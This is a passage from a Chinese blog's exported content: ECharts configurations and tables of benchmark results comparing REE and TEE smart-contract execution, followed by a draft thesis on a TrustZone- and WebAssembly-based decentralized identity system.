},</span><br><span class=\"line\">  xAxis: {</span><br><span class=\"line\">    type: 'category',</span><br><span class=\"line\">    name: 'Number of Clients',</span><br><span class=\"line\">    nameLocation: 'middle',</span><br><span class=\"line\">    nameGap: 25,</span><br><span class=\"line\">    data: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32],</span><br><span class=\"line\">    nameTextStyle: {</span><br><span class=\"line\">      fontSize: 14,</span><br><span class=\"line\">      color: '#333333'</span><br><span class=\"line\">    }</span><br><span class=\"line\">  },</span><br><span class=\"line\">  yAxis: {</span><br><span class=\"line\">    type: 'value',</span><br><span class=\"line\">    name: 'Throughput [tx/s]',</span><br><span class=\"line\">    nameLocation: 'middle',</span><br><span class=\"line\">    nameRotate: 90,</span><br><span class=\"line\">    nameGap: 30,</span><br><span class=\"line\">    nameTextStyle: {</span><br><span class=\"line\">      fontSize: 14,</span><br><span class=\"line\">      color: '#333333'</span><br><span class=\"line\">    }</span><br><span class=\"line\">  },</span><br><span class=\"line\">  series: [</span><br><span class=\"line\">    {</span><br><span class=\"line\">      name: 'REE',</span><br><span class=\"line\">      type: 'line',</span><br><span class=\"line\">      smooth: true,</span><br><span class=\"line\">      data: [0.3066666666666666, 0.6066666666666667, 0.91, 1.23, 1.51, 1.8, 2.1133333333333333, 2.4033333333333333, 2.6766666666666667, 3.0, 3.316666666666667, 3.5733333333333333, 3.8733333333333335, 4.193333333333333, 4.51, 4.763333333333334, 5.066666666666666, 5.336666666666667, 5.613333333333333, 5.973333333333334, 6.18, 6.4, 6.81, 7.036666666666667, 7.14, 7.396666666666666, 7.81, 8.09, 8.366666666666667, 8.483333333333333, 8.683333333333334, 9.18]</span><br><span class=\"line\">    },</span><br><span class=\"line\">    {</span><br><span class=\"line\">      name: 'TEE',</span><br><span class=\"line\">      type: 'line',</span><br><span class=\"line\">      smooth: true,</span><br><span class=\"line\">      data: [0.3033333333333333, 0.58, 0.8766666666666667, 1.1733333333333331, 1.3833333333333333, 1.66, 1.9766666666666663, 2.2333333333333334, 2.333333333333333, 2.7266666666666666, 2.893333333333333, 3.0766666666666667, 3.46, 3.6233333333333335, 3.72, 3.813333333333333, 4.086666666666667, 4.333333333333333, 4.433333333333333, 4.71, 4.873333333333333, 5.02, 5.126666666666667, 5.0, 5.016666666666667, 5.13, 4.9, 5.046666666666667, 4.996666666666667, 5.153333333333333, 5.1066666666666665, 5.026666666666666]</span><br><span class=\"line\">    }</span><br><span class=\"line\">  ]</span><br><span class=\"line\">};</span><br></pre></td></tr></table></figure>\n<p>tx 延迟</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">var option = {</span><br><span class=\"line\">  tooltip: {</span><br><span class=\"line\">    trigger: 'axis',</span><br><span class=\"line\">    axisPointer: {</span><br><span class=\"line\">      type: 'shadow'</span><br><span class=\"line\">    }</span><br><span class=\"line\">  },</span><br><span class=\"line\">  xAxis: {</span><br><span class=\"line\">    data: [1, 2, 4, 8, 16, 32]</span><br><span class=\"line\">  },</span><br><span class=\"line\">  yAxis: {</span><br><span class=\"line\">   </span><br><span class=\"line\">  },</span><br><span class=\"line\">  series: [</span><br><span class=\"line\">    {</span><br><span class=\"line\">      name: 'REE',</span><br><span class=\"line\">      type: 'bar',</span><br><span class=\"line\">      data: [3.19159, 3.195985, 3.18846295392954, 3.255676615811373, 3.2775623512946117, 3.405997810457517],</span><br><span class=\"line\">      label: {</span><br><span class=\"line\">        show: true,</span><br><span class=\"line\">        position: 'top',</span><br><span class=\"line\">        formatter: function (params) {</span><br><span class=\"line\">          return params.value.toFixed(2);</span><br><span class=\"line\">        },</span><br><span class=\"line\">        textStyle: {</span><br><span class=\"line\">          color: '#333333'</span><br><span class=\"line\">        }</span><br><span class=\"line\">      }</span><br><span class=\"line\">    },</span><br><span class=\"line\">    {</span><br><span class=\"line\">      name: 'TEE',</span><br><span class=\"line\">      type: 'bar',</span><br><span class=\"line\">      data: [3.2055, 3.34902, 3.316692926136364, 3.493331343283582, 4.346150387453874, 6.369150669761274],</span><br><span class=\"line\">      label: {</span><br><span class=\"line\">        show: true,</span><br><span class=\"line\">        position: 'top',</span><br><span class=\"line\">        formatter: function (params) {</span><br><span class=\"line\">          return params.value.toFixed(2);</span><br><span class=\"line\">        },</span><br><span class=\"line\">        textStyle: {</span><br><span class=\"line\">          color: '#333333'</span><br><span class=\"line\">        }</span><br><span class=\"line\">      }</span><br><span class=\"line\">    }</span><br><span class=\"line\">  ]</span><br><span class=\"line\">};</span><br></pre></td></tr></table></figure>\n<p>query ps</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">var option = {</span><br><span class=\"line\">  tooltip: {</span><br><span class=\"line\">    trigger: 'axis'</span><br><span class=\"line\">  },</span><br><span class=\"line\">  xAxis: {</span><br><span class=\"line\">    </span><br><span class=\"line\">    data: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32]</span><br><span class=\"line\">  },</span><br><span class=\"line\">  yAxis: {</span><br><span class=\"line\">    </span><br><span class=\"line\">  },</span><br><span class=\"line\">  series: [</span><br><span class=\"line\">    {</span><br><span class=\"line\">      name: 'REE',</span><br><span class=\"line\">      type: 'line',</span><br><span class=\"line\">      smooth: true,</span><br><span class=\"line\">      data: [9.05, 15.183333333333334, 17.25, 19.216666666666665, 21.183333333333334, 21.03333333333333, 21.25, 21.6, 21.5, 21.28333333333333, 22.216666666666665, 23.2, 23.266666666666666, 23.08333333333333, 22.95, 23.383333333333333, 23.166666666666668, 23.25, 23.15, 23.133333333333333, 23.0, 22.883333333333333, 23.48333333333333, 23.23333333333333, 23.1, 23.066666666666663, 23.383333333333333, 23.016666666666666, 23.15, 23.516666666666666, 23.3, 23.65],</span><br><span class=\"line\">      label: {</span><br><span class=\"line\">        show: false,</span><br><span class=\"line\">        position: 'top',</span><br><span class=\"line\">        formatter: function (params) {</span><br><span class=\"line\">          return params.value.toFixed(2);</span><br><span class=\"line\">        }</span><br><span class=\"line\">      }</span><br><span class=\"line\">    },</span><br><span class=\"line\">    {</span><br><span class=\"line\">      name: 'TEE',</span><br><span class=\"line\">      type: 'line',</span><br><span class=\"line\">      smooth: true,</span><br><span class=\"line\">      data: [6.633333333333334, 10.216666666666669, 10.3, 10.283333333333331, 10.35, 10.4, 10.483333333333333, 10.65, 10.75, 10.766666666666667, 10.766666666666667, 10.55, 10.583333333333334, 10.616666666666667, 10.7, 10.666666666666666, 10.766666666666667, 10.783333333333331, 10.766666666666667, 11.033333333333331, 11.066666666666666, 11.1, 11.15, 10.633333333333333, 10.75, 10.983333333333333, 10.733333333333333, 10.716666666666669, 10.766666666666667, 10.533333333333331, 11.083333333333334, 11.133333333333333],</span><br><span class=\"line\">      label: {</span><br><span class=\"line\">        show: false,</span><br><span class=\"line\">        position: 'top',</span><br><span class=\"line\">        formatter: function (params) {</span><br><span class=\"line\">          return params.value.toFixed(2);</span><br><span class=\"line\">        }</span><br><span class=\"line\">      }</span><br><span class=\"line\">    }</span><br><span class=\"line\">  ]</span><br><span class=\"line\">};</span><br></pre></td></tr></table></figure>\n<p>query 延迟</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">var option = {</span><br><span class=\"line\">  tooltip: {</span><br><span class=\"line\">    trigger: 'axis',</span><br><span class=\"line\">    axisPointer: { type: 'shadow' }</span><br><span class=\"line\">  },</span><br><span class=\"line\">  xAxis: {</span><br><span class=\"line\">    type: 'category',</span><br><span class=\"line\">    name: 'Number of Clients',</span><br><span class=\"line\">    nameLocation: 'middle',</span><br><span class=\"line\">    nameGap: 25,</span><br><span class=\"line\">    nameTextStyle: {</span><br><span class=\"line\">      fontSize: 14,  // 字体大小更大</span><br><span class=\"line\">      color: '#333333'  // 更深的颜色</span><br><span class=\"line\">    },</span><br><span class=\"line\">    data: [1, 2, 4, 8, 16, 32]</span><br><span class=\"line\">  },</span><br><span class=\"line\">  yAxis: {</span><br><span class=\"line\">    type: 'value',</span><br><span class=\"line\">    name: 'Average Latency (s)',</span><br><span class=\"line\">    nameLocation: 'middle',</span><br><span class=\"line\">    nameRotate: 90,</span><br><span class=\"line\">    nameGap: 30,</span><br><span class=\"line\">    nameTextStyle: {</span><br><span class=\"line\">      fontSize: 14,</span><br><span class=\"line\">      color: '#333333'</span><br><span class=\"line\">    }</span><br><span class=\"line\">  },</span><br><span class=\"line\">  series: [</span><br><span class=\"line\">    {</span><br><span class=\"line\">      name: 'REE',</span><br><span class=\"line\">      type: 'bar',</span><br><span class=\"line\">      data: [0.06019, 0.0815299012074643, 0.1581888464874241, 0.3210821604938271, 0.6368470064148254, 1.3139740521494012],</span><br><span class=\"line\">      label: {</span><br><span class=\"line\">        show: true,</span><br><span class=\"line\">        position: 'top',</span><br><span class=\"line\">        formatter: function (params) {</span><br><span class=\"line\">          return params.value.toFixed(2);</span><br><span class=\"line\">        },</span><br><span class=\"line\">        textStyle: {</span><br><span class=\"line\">          color: '#333333'</span><br><span class=\"line\">        }</span><br><span class=\"line\">      }</span><br><span class=\"line\">    },</span><br><span class=\"line\">    {</span><br><span class=\"line\">      name: 'TEE',</span><br><span class=\"line\">      type: 'bar',</span><br><span class=\"line\">      data: [0.10025, 0.1456397063621533, 0.3393615397082657, 0.7052192801251956, 1.467368390625, 2.8896027245508984],</span><br><span class=\"line\">      label: {</span><br><span class=\"line\">        show: true,</span><br><span class=\"line\">        position: 'top',</span><br><span class=\"line\">        formatter: function (params) {</span><br><span class=\"line\">          return params.value.toFixed(2);</span><br><span class=\"line\">        },</span><br><span class=\"line\">        textStyle: {</span><br><span class=\"line\">          color: '#333333'</span><br><span class=\"line\">        }</span><br><span class=\"line\">      }</span><br><span class=\"line\">    }</span><br><span class=\"line\">  ]</span><br><span class=\"line\">};</span><br></pre></td></tr></table></figure>\n<p>Query，TDR</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>TZ4Fabric</th>\n<th>Our</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>0.50</td>\n<td>0.27</td>\n</tr>\n<tr>\n<td>2</td>\n<td>0.59</td>\n<td>0.33</td>\n</tr>\n<tr>\n<td>4</td>\n<td>0.59</td>\n<td>0.46</td>\n</tr>\n<tr>\n<td>8</td>\n<td>0.61</td>\n<td>0.51</td>\n</tr>\n<tr>\n<td>16</td>\n<td>0.67</td>\n<td>0.54</td>\n</tr>\n<tr>\n<td>32</td>\n<td>0.79</td>\n<td>0.53</td>\n</tr>\n</tbody>\n</table>\n<p>TX，TDR</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>TZ4Fabric</th>\n<th>OUR</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>0.46</td>\n<td>0.01</td>\n</tr>\n<tr>\n<td>2</td>\n<td>0.62</td>\n<td>0.04</td>\n</tr>\n<tr>\n<td>4</td>\n<td>0.61</td>\n<td>0.05</td>\n</tr>\n<tr>\n<td>8</td>\n<td>0.61</td>\n<td>0.07</td>\n</tr>\n<tr>\n<td>16</td>\n<td>0.68</td>\n<td>0.24</td>\n</tr>\n<tr>\n<td>32</td>\n<td>0.79</td>\n<td>0.45</td>\n</tr>\n</tbody>\n</table>\n<p>QUERY，LIR</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>TZ4Fabric</th>\n<th>OUR</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>1.63</td>\n<td>0.67</td>\n</tr>\n<tr>\n<td>2</td>\n<td>1.70</td>\n<td>0.79</td>\n</tr>\n<tr>\n<td>4</td>\n<td>1.52</td>\n<td>1.15</td>\n</tr>\n<tr>\n<td>8</td>\n<td>1.75</td>\n<td>1.2</td>\n</tr>\n<tr>\n<td>16</td>\n<td>3.18</td>\n<td>1.3</td>\n</tr>\n<tr>\n<td>32</td>\n<td>4.92</td>\n<td>1.2</td>\n</tr>\n</tbody>\n</table>\n<p>TX，LIR</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>TZ4Fabric</th>\n<th>OUR</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>1.48</td>\n<td>0.01</td>\n</tr>\n<tr>\n<td>2</td>\n<td>1.48</td>\n<td>0.05</td>\n</tr>\n<tr>\n<td>4</td>\n<td>1.54</td>\n<td>0.04</td>\n</tr>\n<tr>\n<td>8</td>\n<td>1.88</td>\n<td>0.07</td>\n</tr>\n<tr>\n<td>16</td>\n<td>3.46</td>\n<td>0.33</td>\n</tr>\n<tr>\n<td>32</td>\n<td>5.11</td>\n<td>0.87</td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">var option = {</span><br><span class=\"line\">  tooltip: {</span><br><span class=\"line\">    trigger: 'axis',</span><br><span class=\"line\">    axisPointer: { type: 'shadow' }</span><br><span class=\"line\">  },</span><br><span class=\"line\">  legend: {</span><br><span class=\"line\">    data: ['Create DID', 'Query DID', 'Verify VC']</span><br><span class=\"line\">  },</span><br><span class=\"line\">  xAxis: {</span><br><span class=\"line\">    type: 'category',</span><br><span class=\"line\">    name: 'Number of Clients',</span><br><span class=\"line\">    nameLocation: 'middle',</span><br><span class=\"line\">    nameGap: 25,</span><br><span class=\"line\">    data: [1, 2, 4, 8, 16, 32]</span><br><span class=\"line\">  },</span><br><span class=\"line\">  yAxis: {</span><br><span class=\"line\">    type: 'log',</span><br><span class=\"line\">    logBase: 10,</span><br><span class=\"line\">    name: 'Average Latency (ms)',</span><br><span class=\"line\">    nameLocation: 'middle',</span><br><span class=\"line\">    nameRotate: 90,</span><br><span class=\"line\">    nameGap: 50</span><br><span class=\"line\">  },</span><br><span class=\"line\">  series: [</span><br><span class=\"line\">    {</span><br><span class=\"line\">      name: 'Create DID',</span><br><span class=\"line\">      type: 'bar',</span><br><span class=\"line\">      data: [3576.84, 3729.38, 4066.33, 4930.49, 10636.77, 15473.30],</span><br><span class=\"line\">      label: {</span><br><span class=\"line\">        show: false,</span><br><span class=\"line\">        position: 'top',</span><br><span class=\"line\">        formatter: function (params) {</span><br><span class=\"line\">          return params.value.toFixed(2);</span><br><span class=\"line\">        }</span><br><span class=\"line\">      }</span><br><span class=\"line\">    },</span><br><span class=\"line\">    {</span><br><span class=\"line\">      name: 'Query DID',</span><br><span class=\"line\">      type: 'bar',</span><br><span class=\"line\">      data: [268.04, 223.88, 554.75, 1153.51, 2402.07, 4921.97],</span><br><span class=\"line\">      label: {</span><br><span class=\"line\">        show: false,</span><br><span class=\"line\">        position: 'top',</span><br><span class=\"line\">        formatter: function (params) {</span><br><span class=\"line\">          return params.value.toFixed(2);</span><br><span class=\"line\">        }</span><br><span class=\"line\">      }</span><br><span class=\"line\">    },</span><br><span class=\"line\">    {</span><br><span class=\"line\">      name: 'Verify VC',</span><br><span class=\"line\">      type: 'bar',</span><br><span class=\"line\">      data: [5098.85, 7031.80, 10535.48, 19186.71, 35667.59, 71484.48],</span><br><span class=\"line\">      label: {</span><br><span class=\"line\">        show: false,</span><br><span class=\"line\">        position: 'top',</span><br><span class=\"line\">        formatter: function (params) {</span><br><span class=\"line\">          return params.value.toFixed(2);</span><br><span class=\"line\">        }</span><br><span class=\"line\">      }</span><br><span class=\"line\">    }</span><br><span class=\"line\">  ]</span><br><span class=\"line\">};</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","categories":["笔记"],"tags":["TrustZone","智能合约","毕设","性能测试"]},{"title":"毕设22 - 论文的草稿","url":"/graduation-project/22/","content":"<p>论文草稿</p>\n<span id=\"more\"></span>\n<h1 id=\"基于-trustzone-的区块链分布式数字身份\">基于 TrustZone\n的区块链分布式数字身份</h1>\n<p>智能合约+Wasm+TrustZone 做了一个结合。</p>\n<ul>\n<li><p>TrustZone：区块链上实现隐私计算，例如可以实现匿名投票、数字身份的零知识证明</p></li>\n<li><p>Wasm\n：降低智能合约开发难度，易于扩展。（现有的智能合约+TrustZone的论文，要实现一个新的智能合约就得重新写一个新的TA）</p></li>\n</ul>\n<p>TrustZone 分为 REE 和 TEE 两部分</p>\n<ul>\n<li>REE 侧负责区块链除了智能合约以外的工作，包括共识等</li>\n<li>TEE 侧负责执行智能合约。TA 内嵌入了一个 wasm 运行时，可以执行 wasm\n字节码</li>\n</ul>\n<p>TEE\n的安全存储中存放一个共享的私钥；区块链上公开对应的公钥。（可以通过非对称加密方式，实现隐私保护）</p>\n<p>比如数字身份系统中，用户提供给验证者加密后的VC，验证者将VC发送给区块链进行验证，区块链可以解密VC、验证正确性，将结果返回给验证者。实现零知识证明。</p>\n<p>先看一下要做哪些实验。</p>\n<p>方法定型了。</p>\n<p>验证一下都有效，做批量实验。</p>\n<p>智能合约 + Wasm + TrustZone</p>\n<ol type=\"1\">\n<li>介绍背景，方法</li>\n<li>看一下相关工作</li>\n<li>至少做两个实验，找一个基础方法来对比一下</li>\n<li>能做什么做什么，可以</li>\n<li>preliminary，相关工作，方法</li>\n<li>攻击实验，</li>\n<li>看别人did的论文都用什么指标的评估</li>\n</ol>\n<p>智能合约，TrustZone，Wasm，</p>\n<h1 id=\"abstract\">Abstract</h1>\n<p>随着区块链技术的发展，越来越多的应用对链上计算提出了隐私保护与可信执行的更高要求。然而，传统智能合约在执行过程中公开所有输入、状态与逻辑，难以满足涉及敏感数据场景下的隐私需求。针对这一问题，本文提出了一种基于\nARM TrustZone 与\nWebAssembly（Wasm）的轻量级智能合约执行架构。该系统通过将合约逻辑与数据处理隔离至\nTrustZone\n安全世界，实现了硬件级的隐私保护，同时保持了与标准区块链框架的良好兼容性。为支持链上请求与受限环境下可信执行的协同，本文设计了基于共享内存与扩展\nWASI 接口的高效通信机制。</p>\n<p>在此基础上，本文实现了一个支持加密形式下可验证凭证（VC）校验的去中心化身份（DID）系统，采用\nECDH 密钥交换与 AES\n加密，提供轻量级的零知识式认证功能，适用于资源受限环境。实验评估表明，尽管引入了\nTrustZone\n带来一定的性能开销，系统在查询、交易及隐私验证等操作中仍保持了良好的延迟与吞吐表现。研究结果验证了在移动终端与边缘计算设备上部署隐私增强型智能合约系统的可行性，为隐私保护型链上计算提供了一种切实可行的解决方案。</p>\n<p>With the advancement of blockchain technology, an increasing number\nof applications demand stronger privacy protection and trusted execution\nfor on-chain computation. However, traditional smart contracts expose\nall inputs, states, and logic during execution, posing significant\nprivacy risks in scenarios involving sensitive data. To address this\nissue, this paper proposes a lightweight smart contract execution\narchitecture based on ARM TrustZone and WebAssembly (Wasm). By isolating\ncontract logic and data processing within the TrustZone Secure World,\nthe system achieves hardware-level privacy protection while maintaining\ncompatibility with standard blockchain frameworks. To support\ncollaboration between on-chain requests and trusted execution in\nconstrained environments, an efficient communication mechanism based on\nshared memory and extended WASI interfaces is designed.</p>\n<p>Building on this architecture, we implement a decentralized identity\n(DID) system that supports verifiable credential (VC) verification in\nencrypted form. By leveraging ECDH key agreement and AES encryption, the\nsystem provides lightweight zero-knowledge style authentication suitable\nfor resource-constrained environments. Experimental evaluations show\nthat although TrustZone introduces some performance overhead, the system\nmaintains good latency and throughput performance in query, transaction,\nand privacy verification operations. The results validate the\nfeasibility of deploying privacy-enhancing smart contracts on mobile and\nedge devices, offering a practical solution for privacy-preserving\non-chain computation.</p>\n<h1 id=\"introduction\">Introduction</h1>\n<p>随着区块链技术的发展，越来越多的应用对链上计算提出了隐私保护与可信执行的更高要求。传统智能合约的执行过程完全公开，所有输入、状态与逻辑均暴露于链上，对于涉及用户身份、行为记录等敏感数据的应用场景（如隐私投票、身份验证、医疗数据共享等）而言，存在严重的隐私泄露风险。因此，如何在保证合约可验证性的前提下实现隐私保护，成为区块链系统设计中的关键挑战。</p>\n<p>为实现隐私保护与结果可验证兼备的链上计算，现有研究主要沿两条路径展开：一是利用零知识证明技术，使验证方在不获取原始数据的情况下验证计算结果的正确性；二是通过可信执行环境（TEE）提供硬件级隔离，确保合约逻辑在受保护的环境中运行。这些方案虽在安全性和隐私性方面表现出色，但通常存在部署门槛高、计算资源消耗大或依赖特定硬件平台等限制，难以满足轻量化、可移植的区块链应用需求。</p>\n<p>为解决现有隐私计算方案在资源占用与开发复杂性上的局限，本文提出一种基于\n<strong>ARM TrustZone 和 WebAssembly（Wasm）</strong>\n的轻量级隐私保护智能合约系统。该系统以 TrustZone\n作为合约执行的可信基础，通过引入 Wasm\n运行环境，支持在受限设备上灵活部署与安全执行合约逻辑，兼顾隐私性与可验证性。</p>\n<p>在该架构基础上，我们设计并实现了一个分布式数字身份系统，允许用户在不泄露身份敏感信息的前提下完成特定身份属性的可信验证。该系统基于硬件信任机制实现零知识式的凭证校验，具备计算开销低、无需可信设定、部署门槛低等优点，特别适用于移动终端和边缘计算等场景下的隐私保护需求。</p>\n<p>本文的主要贡献如下：</p>\n<ul>\n<li>提出一种基于 TrustZone 和 Wasm 的智能合约执行架构，实现合约逻辑在\nTEE 中的安全执行与链上状态交互。</li>\n<li>设计并实现一个轻量级分布式数字身份系统，支持 VC\n的加密提交与可信验证，保护用户隐私。</li>\n<li>提出一种结合共享密钥协商与对称加密的“零知识式”验证机制，替代传统 ZK\n方法，适用于资源受限设备。</li>\n</ul>\n<h1 id=\"related-work\">Related Work</h1>\n<p>安全、隐私的智能合约，有一些实现，但是使用困难，不容易应用于开发场景。</p>\n<p>DID系统的零知识证明，多基于数学层面，证明生成开销大，实现复杂，对硬件依赖较重。</p>\n<blockquote>\n<p>口语化的写一下：</p>\n<p>TZ4Fabric: Executing Smart Contracts with ARM TrustZone，实现在 TEE\n中执行 Fabric 的链码。</p>\n<p>但是，这个项目有几个缺陷。第一，TZ4Fabric\n中所谓的链码，本质上就是一个TA。每要实现一个新的链码，就要重写一个 TA\n。TA\n的执行过程是一个状态机，明确的将一个智能合约请求分割成几个操作步骤，如获取状态、写入状态等。对于一些复杂的智能合约，这样的TA就会变得极为复杂，难以维护。</p>\n<p>第二，用户想要部署新的智能合约，必须更新区块链节点代码、修改\nchaincode_proxy 使其可以代理新的\nTA、重新编译新的链码。这个过程必须要重启TrustZone的服务，更新区块链实现。在实际场景中显然是不现实的。</p>\n<p><del>第三，网络请求的方式调用链码，一定程度增加了系统的延迟，增强了系统被攻击的可能。</del>（论文中提到了，主要性能瓶颈不在网络请求而是在于TEEC_OpenSession）</p>\n</blockquote>\n<blockquote>\n<p>WaTZ提供了一种在TrustZone中移植WAMR的方法，本文在其基础上，实现了能在的TEE中运行\nwasm 智能合约。</p>\n</blockquote>\n<blockquote>\n<p>零知识证明：</p>\n<p><strong>zk-SNARK（Zero-Knowledge Succinct Non-Interactive Argument of\nKnowledge）</strong>是一类高效的非交互式零知识证明系统，能够为任意计算生成体积极小、验证速度极快的证明。该技术已被应用于\nZcash、Tornado Cash 等项目中，用于实现匿名交易或选择性隐私。</p>\n<ul>\n<li>需要可信设定（trusted\nsetup），若初始设定密钥泄露，系统安全性将完全丧失；而该系统私钥存放在\nTrustZone 的安全世界，不容易泄露。</li>\n<li>开发门槛高，必须将计算逻辑手动转化为电路或约束系统，过程复杂，证明生成开销较大，不适合大规模计算；而该系统只需要用secp256r1交换密钥后对称加密凭证，即可创建零知识证明。</li>\n</ul>\n<p><strong>zk-STARK（Scalable Transparent ARguments of\nKnowledge）</strong>不依赖可信设定，且仅使用哈希函数构建证明，具备抗量子攻击能力，适用于大规模计算验证。StarkWare、StarkNet、zkML\n等项目基于此构建高扩展性的区块链和隐私计算系统。</p>\n<ul>\n<li>开发难度较高，需要将程序转化为中间表示（AIR）并进行特定形式的编译，在移动设备或低功耗环境中部署困难，证明生成对硬件资源依赖较重；该系统在低功耗设备中部署也很简单。</li>\n</ul>\n<p>虽然现有 zk\n系统在安全性与隐私性方面表现出色，但它们普遍存在<strong>计算开销大、开发门槛高、设备适应性差</strong>等问题，不适合资源受限环境或通用开发场景。</p>\n<p>相比之下，本文提出的系统利用 <strong>ARM TrustZone\n的安全执行环境（TEE）</strong>作为智能合约执行平台，将合约逻辑完全隔离至硬件安全区中，并通过对称加密、共享密钥协商等机制保护用户隐私。该方案无需电路编译、无需可信设定，能够以更高的工程实用性和开发友好性，在移动终端、边缘设备等环境下实现隐私保护与可验证计算。</p>\n</blockquote>\n<blockquote>\n<p>有些研究表明 TrustZone\n的安全存储仍存在被攻击的可能，但是这不在本文的研究范围之内。</p>\n<p>[Hardware-Backed Heist]</p>\n</blockquote>\n<p>可信执行环境（Trusted Execution Environment,\nTEE）已广泛应用于提升区块链智能合约执行的安全性与隐私性【CosmWasm，】。<strong>TZ4Fabric</strong>\n系统 [1] 将 ARM TrustZone 与 Hyperledger Fabric 结合，实现了在 TEE\n中执行链码逻辑的功能。然而，该系统存在两个主要局限。首先，TZ4Fabric\n中的链码需被实现为独立的 Trusted\nApplication（TA），其执行逻辑被构建为状态机，需要显式地将智能合约请求分解为获取状态、写入状态等底层操作。对于复杂的业务逻辑，这种方式不仅难以扩展，也极难维护。其次，部署新的智能合约需要修改区块链节点代码、更新代理组件（chaincode\nproxy）、重新编译 TA 并重启 TrustZone\n服务，在去中心化或动态部署场景下难以落地。</p>\n<p><strong>WaTZ</strong> 系统 [2] 提出了一种将 WebAssembly Micro\nRuntime（WAMR）[WAMR]嵌入 TrustZone\n的方法，并结合远程认证机制构建了多租户可信执行框架。虽然本文并未采用\nWaTZ 中的远程认证机制，但在系统实现中参考了其对 WAMR 在 TEE\n中移植与封装的技术路线。基于此，本文构建了一个支持通用 WebAssembly\n智能合约执行的 TEE 合约运行环境，允许合约在无需修改链核心或重启 TEE\n服务的前提下动态部署、加载与执行，显著提升了系统的可扩展性与开发灵活性。</p>\n<p>在隐私验证方向，已有大量研究探索零知识证明系统，例如\n<strong>zk-SNARK</strong> [3] 与 <strong>zk-STARK</strong>\n[4]。前者能够生成体积小、验证快的非交互式证明，已被应用于 Zcash、Tornado\nCash\n等项目中，但依赖可信设定，且电路建模复杂、证明生成开销大。后者不依赖可信设定且具备抗量子攻击能力，但对硬件资源要求高，不适用于低功耗设备。相比之下，本文提出的方案采用轻量级的“零知识式”验证方式，用户通过\nECDH 协议生成共享密钥，对凭证进行对称加密，交由 TEE\n解密与验证，无需电路转化与证明生成，适合在移动终端或嵌入式设备中部署。</p>\n<p>值得指出的是，尽管 TrustZone\n提供隔离执行能力，其安全存储机制在特定条件下仍可能受到攻击 [5]。本文默认\nTEE 已部署在可信固件之上，相关侧信道或提权攻击不属于本文的研究范围。</p>\n<h1 id=\"preliminaries\">Preliminaries</h1>\n<h2 id=\"arm-trustzone\">Arm TrustZone</h2>\n<p>Arm TrustZone [TrustZone Explained: Architectural Features and Use\nCases] 是 Arm\n架构中的一种硬件级安全技术，通过在单个CPU内构建两个隔离的执行环境，即安全世界（Secure\nWorld）和普通世界（Normal\nWorld），以硬件方式确保敏感数据与关键任务的安全性。它使安全任务（如加密密钥管理等）与普通应用程序相互隔离，保护免受恶意软件和未经授权访问的威胁。</p>\n<p>OP-TEE [https://www.trustedfirmware.org/projects/op-tee/] 是一个专为\nArm TrustZone\n平台设计的开源可信执行环境（TEE）实现。OP-TEE架构分为两个主要组件：在安全世界运行的TEE核心（OP-TEE\nOS），以及在普通世界运行的客户端库与驱动（OP-TEE Client）。OP-TEE 通过\nGlobalPlatform [GlobalPlatform] 标准化的 TEE 内部\nAPI和外部与普通操作系统的交互接口，允许开发者创建可信应用（Trusted\nApplications，TAs）。</p>\n<h2 id=\"webassembly\">WebAssembly</h2>\n<p>WebAssembly（简称Wasm）[Bringing the web up to speed with\nWebAssembly]\n是一种面向栈、二进制格式的轻量级虚拟机指令集，最初为了在浏览器中高效、安全地运行代码而设计。它允许开发者使用C、C++、Rust等高级语言编写程序，并将其编译成可跨平台执行的二进制模块，从而在网页上实现接近本地性能的复杂计算任务。WebAssembly具有快速加载、低延迟、语言无关和沙箱化安全执行的特性，已成为浏览器之外的服务器、边缘计算和物联网领域高效运行应用的关键技术。</p>\n<h2 id=\"分布式数字身份did\">分布式数字身份（DID）</h2>\n<p>分布式数字身份（Decentralized Identifier，简称DID）[W3C DID]\n是一种去中心化的数字身份管理方式，使用户能够自主掌控并管理自己的数字身份，无需依赖传统的中心化身份服务商。每个DID都是一个全局唯一的标识符，通常与用户掌控的数字凭证（如密钥）绑定，从而确保身份信息的自主控制性、可验证性和隐私保护。</p>\n<p>可验证凭证（Verifiable Credentials，简称VC）[W3C VC]\n是为支持可信数字身份信息交换而制定的数字证书标准，通常与DID结合使用。VC\n的使用过程通常涉及三个关键参与方VC\n的使用过程通常涉及三个关键参与方：发行者（Issuer）、持有者（Holder）和验证方（Verifier）。发行者对凭证进行数字签名，以证明其真实性和有效性；持有者自主存储和管理凭证，并决定凭证的披露范围；验证方则通过密码学方法对凭证进行验证，而无需与发行方直接交互，从而保证验证的安全性和隐私性。</p>\n<h2 id=\"区块链和智能合约\">区块链和智能合约</h2>\n<p>区块链是一种去中心化的分布式账本技术，将交易数据记录在连续区块中，并在网络节点之间共享与同步，以实现数据的不可篡改和可追溯性。智能合约则是运行在区块链上的自动化程序，以预定义的规则和逻辑来自动执行、验证和强制履行合约条款，从而无需第三方中介即可实现可信交易。区块链与智能合约的结合广泛应用于金融交易、供应链管理、数字身份认证、去中心化应用（DApps）等场景，构建了更透明、安全、高效的数字信任体系。</p>\n<h2 